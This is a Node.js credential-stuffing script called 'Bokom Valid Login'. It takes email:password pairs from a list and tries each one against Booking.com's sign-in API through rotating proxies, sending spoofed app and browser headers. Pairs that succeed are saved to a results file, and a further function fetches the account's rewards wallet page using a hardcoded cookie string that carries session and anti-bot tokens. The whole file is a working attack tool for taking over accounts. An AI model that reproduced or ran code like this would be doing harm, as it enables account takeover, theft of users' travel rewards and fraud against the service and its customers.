process.on('uncaughtException', () => console.log)
const fs = require('fs');
const delay = require('delay');
var no = 1;
var chalk = require('chalk');
var fetch = require('node-fetch');
const moment = require("moment-timezone");
const colors = require('@colors/colors');
const figlet = require('figlet');
const {
    v4: uuidv4
} = require('uuid');
var {
    HttpsProxyAgent
} = require('https-proxy-agent');

function fieldMail(proxy, email, deviceid) {
    var index = fetch('https://account.booking.com/api/identity/authenticate/v1.0/enter/email/submit', {
            agent: new HttpsProxyAgent(`http://${proxy}`),
            method: 'POST',
            headers: {
                'Host': 'account.booking.com',
                'X-Library': 'okhttp+network-api',
                'User-Agent': 'Booking.App/31.0 Android/7.1.2; Type: mobile; AppStore: google; Brand: samsung; Model: SM-G988N;',
                'Content-Type': 'application/json; charset=UTF-8',
                'Content-Length': '313',
                'Accept-Encoding': 'gzip, deflate, br'
            },
            body: JSON.stringify({
                'action': 'STEP_ENTER__EMAIL__SUBMIT',
                'deviceContext': {
                    'aid': 337862,
                    'deviceId': '499b6eb8-b699-41d7-b2c2-b0d1d4f418c6',
                    'deviceType': 'DEVICE_TYPE_ANDROID_NATIVE',
                    'lang': 'id',
                    'libVersion': '1.0.33',
                    'oauthClientId': 'eEUpvtgPz7Gv2NSOduzD'
                },
                'identifier': {
                    'type': 'IDENTIFIER_TYPE__EMAIL',
                    'value': email
                }
            })
        })
        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}


function getReward(proxy, bkng_sso_ses, bkng_sso_session) {
    var index = fetch('https://secure.booking.com/rewards_and_wallet/wallet.html', {
    agent: new HttpsProxyAgent(`http://${proxy}`),
    headers: {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'cookie': `px_init=0; _pxvid=5049716c-f455-11ee-8f4f-23f5baa471c3; pcm_personalization_disabled=0; cors_js=1; _gcl_au=1.1.974504629.1712509726; _scid=a58735c6-894d-456c-bf27-aacb37fef8b5; _yjsu_yjad=1712509727.4afd56c8-c4a9-46c2-a481-bdaf5e1cbb32; FPID=FPID2.2.0FJxrlYIVKYTSm7QOeN53%2Bw7wdyeaXr36j0fZzEnzgs%3D.1712435779; _pin_unauth=dWlkPVpEZGlNalZtTkdFdE1tRTJOaTAwTmpkbExXSmlPV010Wm1aall6RTNOemhqT1dOaQ; _sctr=1%7C1712509200000; lastRskxRun=1712511199993; rskxRunCookie=0; rCookie=gndbekr85ass5znt13q74olupsyarj; _gac_UA-116109-18=1.1712511300.Cj0KCQjwiMmwBhDmARIsABeQ7xThGRvIKkdGgQLpwzbGAkG-d24sF-n6PUBO9rJqANA3RjS1jbVPNU8aArjuEALw_wcB; _gcl_aw=GCL.1712511301.Cj0KCQjwiMmwBhDmARIsABeQ7xThGRvIKkdGgQLpwzbGAkG-d24sF-n6PUBO9rJqANA3RjS1jbVPNU8aArjuEALw_wcB; cto_bundle=2TfqD19Yb0FoTEk3WXBjWXFFTnolMkIydWt6aGRFSnNITG1yQ25TbFRrRm1MaXdvUHRiRVo0MUlWUSUyQjNnVlo2Z2dONWElMkZ3a1RqamtEdVBZR1B4SG1DTHhKZWRMTnhJMGpYMk9XNG94ajlmUUMwUkYxS3EyUzVhZEdFcEZEMFh3SSUyRnQ3bnBYV2d0dXlSJTJGQnczcUFnb21NZ2hBRVNDU2tWQ2phYzJ4Y1YzckU5VVdQS2F0ODQlMkJkckJzcUZNMEsxdWFEVE52JTJGenRIQmg5U3R6QkZBRjBubDBXdyUyQk9TQSUzRCUzRA; _derived_epik=dj0yJnU9aGNpcF9md0wzRTRzT055RFZsRlVFcmprUEtSY2pGVlkmbj1vZDFQTW9tanh6Smp6R09iRXdBU1BRJm09NCZ0PUFBQUFBR1lTM1FVJnJtPTQmcnQ9QUFBQUFHWVMzUVUmc3A9Mg; BJS=-; _gid=GA1.2.377341089.1713187585; _scid_r=a58735c6-894d-456c-bf27-aacb37fef8b5; FPLC=uaR2vjz6BQu6qXmwKUcdSBMDHexqQTxH0rDQSh0qfqiXpr%2BSny73blCPjqsMZqcfoTpqHQOOK6J7gu5KHRUyiequGwrDMaz8UPZSvIFHVgGtk4Kg%2BggIne1CknOPew%3D%3D; pxcts=be4acfa3-fbdc-11ee-b777-b03cef962e91; _px3=de7558a77176a028ce015d15ee414d8c55b4558d94034b5ede8a15670426dd20:O1LHpcHVjWuNn5LAKiQJ9rT0qqrPgIWgIjKJndEpyq4UXxdb19GgmC13+wdO85VE60U9hTHLXWi1CbqKFiUHcw==:1000:Cepimi0l+FU0Hwm6TK53LNvwoEc5D4SZdd2ZnR5DneGhKas4154I3Fs25u2UHNakfpcoSjI1/f+qX1tm2/ad9B6B/f3gvsQp3tnLaMiWQ3bmHQtf87VKjAuA65cS94Fd9O+w0nQWJV6iUuJV2BPpq/CawbLRYti5vgaQeCL97chd/Ra3UDcYT8lY/Mmonr52KWnCTHCKx2R5xSQeXdXY0hkHf17L1ZpWAfN59/rPea4=; _pxde=143b64b31886ca3303020a4a954c1464bbfce2bb6e3d4f0061714b0b32f7b86b:eyJ0aW1lc3RhbXAiOjE3MTMyNjU2NzUyNTYsImZfa2IiOjAsImlwY19pZCI6W119; _gat=1; bkng_sso_ses=${bkng_sso_ses}; bkng_sso_session=${bkng_sso_session}; pcm_consent=consentedAt%3D2024-04-16T11%3A08%3A17.310Z%26countryCode%3DID%26expiresAt%3D2024-10-13T11%3A08%3A17.310Z%26implicit%3Dfalse%26regionCode%3DJK%26regulation%3Dnone%26legacyRegulation%3Dnone%26consentId%3Dad8f84c8-fe4f-4fa8-9dd5-b3e113bfb62e%26analytical%3Dtrue%26marketing%3Dtrue; bkng_sso_auth=CAIQsOnuTRqHAQcIjg1UHs2eM1EtnojmgOR2nYEqu7TEb/6OrRTIRYoNs6VPEycvu5tTmjivPzPH5V9EO65/dKF1SI2CGaK9NgY+GVKHjEj9a9aDKLUEzV2H5Ez/R4n/4iF1VRyWY76t6qv+7P4XtwokvqrmkXNNqImBCBFmhE/JwYC5FsMm3/aq5rpBNl2MSw==; bkng_sso_auth_1713265697=CAIQsOnuTRqHAQcIjg1UHs2eM1EtnojmgOR2nYEqu7TEb/6OrRTIRYoNs6VPEycvu5tTmjivPzPH5V9EO65/dKF1SI2CGaK9NgY+GVKHjEj9a9aDKLUEzV2H5Ez/R4n/4iF1VRyWY76t6qv+7P4XtwokvqrmkXNNqImBCBFmhE/JwYC5FsMm3/aq5rpBNl2MSw==; bkng_prue=1; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Apr+16+2024+18%3A08%3A15+GMT%2B0700+(Western+Indonesia+Time)&version=202403.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=6a4f80e0-7a2c-4823-9898-c1c88cabc764&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1&implicitConsentCountry=nonGDPR&implicitConsentDate=1712509725150&AwaitingReconsent=false&geolocation=PL%3B14&backfilled_at=1713265697409&backfilled_seed=1; OptanonAlertBoxClosed=2024-04-16T10:01:28.180Z; lastSeen=0; _uetsid=c3c4da60fb2b11ee8b9577cabb3f71b7; _uetvid=3d2ac22020aa11eeb952b58212427f51; _ga_A12345=GS1.1.1713265697.5.1.1713265710.0.0.486215513; _ga=GA1.1.976917021.1712435779; _ga_FPD6YLJCJ7=GS1.1.1713265697.6.1.1713265710.47.0.0; bkng=11UmFuZG9tSVYkc2RlIyh9Yaa29%2F3xUOLbp8EZRXTVzcrxdX7f60MvwFUIr2QmWXo0%2FWQkLd%2F5I7KQ0etaR04DUXQGyyw0N3xNWzS7616NwdZSfgP4oYOoFemtYTqWn8xHcVzVKEgXSQlVGxNIdwRqZkjFMxR%2BeDN8i38rzd1AEGcvh%2BpFUm5OB0u0N%2Fw%2BQjWP6bhdcyYxKbXVFKuh0G%2F4jZLpYLORAgAA9uQ1x1SbQQwe7fxERi9uk%2BW2OipLw35v; aws-waf-token=a654bc2a-f2fe-4efc-a4de-97db000ccd55:GgoAveNNkS4SAAAA:sg/AjPKT4n+Ed9YJ5CXeyUto8X3cdao9DS3UZgcCHiO+mgrcl7Sl5alzSDuvBxiCRlQuueFpHikS4J567hx54Cfz1aJsUEk9vP99FIm54Nenk6xSTwZWPrQIvuGjFOXKy+GmR5kFXUpM1j1Q8xR77VoWzoMRuXcub4Ql0WnCqbeNZzJrsS2v0p4ZwmH9+bw3UvYPPPwr3NmxWXhv5q1qIQ6u2aR3GJBpDkCIvSGjdCGqscpXkSiIXWSvq4/wI83meLk=`,
    'referer': 'https://www.booking.com/',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
}
})
        .then(async res => {
            const data = await res.text()
            return data
        })
    return index
}
const fieldPassowrd = (proxy, password, deviceid, value) => new Promise((resolve, reject) => {
    var index = fetch('https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit', {
            agent: new HttpsProxyAgent(`http://${proxy}`),
            method: 'POST',
            headers: {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/json',
                'origin': 'https://account.booking.com',
                'referer': 'https://account.booking.com/sign-in/password',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'x-booking-client': 'ap',
                'x-requested-with': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                'context': {
                    'value': value
                },
                'authenticator': {
                    'type': 'AUTHENTICATOR_TYPE__PASSWORD',
                    'value': password
                }
            })
        })
        .then(async (res) => {
            const data = await res.json()
            const headers2 = res.headers
            const headers = res.headers.raw()['set-cookie'];
            headers.forEach(header => {
                if (header.includes('bkng_sso_session')) {
                    bkng_sso_session = header.split(';')[0].split('=')[1];
                } else if (header.includes('bkng_ap_sso_session')) {
                    bkng_ap_sso_session = header.split(';')[0].split('=')[1];
                } else if (header.includes('bkng_sso_ses')) {
                    bkng_sso_ses = header.split(';')[0].split('=')[1];
                }
            });
            resolve({
                data,
                bkng_sso_session,
                bkng_ap_sso_session,
                bkng_sso_ses
            })
        });
    return index
});

function removeDuplicateChatIds() {
    try {
        // Baca isi file
        const data = fs.readFileSync('akun.txt', 'utf8');
        const email = data.split('\n');
        // Menghapus duplikat
        const uniqueChatIds = Array.from(new Set(email));
        // Menulis kembali ke file
        fs.writeFileSync('akun.txt', uniqueChatIds.join('\n'));
    } catch (error) {
        console.error(`Error: ${error.message}`);
    }
}
const cekLicense = (license) => new Promise((resolve, reject) => {
    fetch(`https://amfcode.my.id/awriganteng.php?license_key=${license}`, {
        method: "GET",
       })
    .then(res => res.json())
    .then(res => resolve(res))
    .catch(err => reject(err))
});
(async () => {
    try {
        var license = fs.readFileSync('license.txt', 'UTF-8');
        const licenseCheckResult = await cekLicense(license);
        if (licenseCheckResult.status == true) {

        } else {
            process.exit(0)
        }

        console.log(
            colors.white(
                figlet.textSync('Bokom Valid Login', {
                    horizontalLayout: 'fitted'
                })
            )
        );
        console.log('               By Ari Maulana Firmansyah\n')
        const kata3 = fs.readFileSync('proxy.txt', 'utf8')
        const list4 = kata3.split(/\r?\n/);
        const lineCount2 = list4.length;
        const randomLineNumber2 = Math.floor(Math.random() * lineCount2)
        var proxy = list4[randomLineNumber2];
        removeDuplicateChatIds()
        const cookies = fs.readFileSync('akun.txt', 'utf8')
        const list = cookies.split(/\r?\n/);
        for (var i = 0; i < list.length; i++) {
            try {
                var email = list[i].split(':')[0];
                var password = list[i].split(':')[1];
                var deviceid = generateDeviceID()
                const inputMail = await fieldMail(proxy, email, deviceid);
                if (inputMail.nextStep == "STEP_REGISTER__PASSWORD") {
                    // Lakukan sesuatu jika diperlukan
                }
                if (inputMail.nextStep == "STEP_ACCOUNT__LOCKED") {
                    // Lakukan sesuatu jika akun terkunci
                } else if (inputMail.nextStep == "STEP_SIGN_IN__PASSWORD") {
                    const value = inputMail.context.value
                    const cekLogin = await fieldPassowrd(proxy, password, deviceid, value)
                    if (cekLogin.data.nextStep == 'STEP_SUCCESS') {
                        const bkng_sso_ses = cekLogin.data.bkng_sso_ses
                        const bkng_sso_session = cekLogin.data.bkng_sso_session
                        console.log(colors.green(`[${i}/${list.length}] ${email}:${password} SUCCESS LOGIN`))
                        fs.appendFileSync('result/login.txt', `${email}:${password}\n`)
                    } else if (cekLogin.data.error[0].code == 'ERROR_CODE__WRONG_PASSWORD') {
                        console.log(colors.red(`[${i}/${list.length}] ${email} Password is incorrect`))
                    }
                } else if (inputMail.nextStep == "STEP_EMAIL_MAGIC_LINK_SENT") {
                    // Lakukan sesuatu jika tautan masuk email sudah dikirim
                } else {
                    // Lakukan sesuatu jika tidak ada langkah selanjutnya
                }
            } catch (err) {
                console.log(colors.red(`[${i}/${list.length}] ${email} UNCHECK}`))
                fs.appendFileSync('result/uncheck.txt', `${email}:${password}\n`)
            }
        }
    } catch (err) {
        // Tangani kesalahan yang terjadi di luar blok perulangan
        console.error('Terjadi kesalahan:', err);
    }
})();

function generateDeviceID() {
    return uuidv4();
}
